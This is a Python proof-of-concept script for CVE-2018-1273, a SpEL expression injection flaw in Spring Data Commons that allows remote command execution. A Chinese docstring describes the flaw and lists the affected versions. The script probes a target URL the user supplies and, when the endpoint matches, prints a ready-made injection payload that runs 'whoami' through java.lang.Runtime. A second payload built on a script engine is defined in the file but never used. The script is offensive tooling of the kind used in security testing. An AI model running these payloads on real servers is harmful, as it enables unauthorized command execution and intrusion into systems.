import requests
from time import sleep
requests.packages.urllib3.disable_warnings()

'''
Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）
Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。

Spring Data Commons 1.13 – 1.13.10 (Ingalls SR10)
Spring Data REST 2.6 – 2.6.10 (Ingalls SR10)
Spring Data Commons 2.0 to 2.0.5 (Kay SR5)
Spring Data REST 3.0 – 3.0.5 (Kay SR5)

参考链接：

https://pivotal.io/security/cve-2018-1273
https://xz.aliyun.com/t/2269
https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&mid=2247483666&idx=1&sn=91e3b2aab354c55e0677895c02fb068c
'''


def poc(url, useragent, proxies=None):
    header = {
        'User-Agent': useragent,
        'Content-Type': 'application/x-www-form-urlencoded'
        }
    path1 = '/users'
    path2 = '/users?page=0&size=5'
    payload1 = "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")]=chybeta&password=chybeta&repeatedPassword=chybeta"
    payload2 = "username[#this.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('whoami')\")]=asdf"

    try:
        urltest1 = url + path1
        urltest2 = url + path2
        re1 = requests.get(url=urltest1, headers=header, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        
        if ((int(re1.status_code) == 200) and ('Users' in str(re1.text))):
            payload = f'{path2} --> post --> data={payload1}'
            return f'[+] CVE-2018-1273 exists. This vulnerability has no echo, please use Dnslog to test. The link: --> {urltest1}\n{payload}'
        else:
            return '[-] CVE-2018-1273 not exists.'
    except Exception as e:
        return f'[-] An error occurred and it has been logged: {e}'

if __name__ == '__main__':
    print(poc(input('请输入目标url:').strip('/'), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'))
